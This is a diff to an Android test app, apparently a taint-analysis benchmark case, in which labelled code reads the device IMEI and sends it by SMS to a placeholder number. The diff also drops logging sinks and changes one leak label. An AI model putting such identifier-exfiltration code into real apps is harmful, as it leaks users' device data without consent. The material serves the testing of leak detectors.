@@ -5,7 +5,6 @@ import android.content.Context;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 
@@ -37,8 +36,6 @@ public class Button2 extends Activity {
 		    	SmsManager sm = SmsManager.getDefault();
 		    	String number = "+49 1234";
 		    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
-		        Log.i("TAG", "sendIMEI: " + imei); //sink, potential leak
-
 		        imei = null;
 		    }
 		});
@@ -50,8 +47,7 @@ public class Button2 extends Activity {
 		    public void onClick(View v) {
 		        imei = null;
 				SmsManager sms = SmsManager.getDefault();
-				sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
-		        Log.i("TAG", "Button 2: " + imei); //sink, no leak
+				sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, no leak
 		    }
 		});
     }
@@ -61,6 +57,5 @@ public class Button2 extends Activity {
 		imei = telephonyManager.getDeviceId(); //source
 		SmsManager sms = SmsManager.getDefault();
 		sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
-		Log.i("TAG", "Button3: " + imei); //sink, leak
 	}
 }
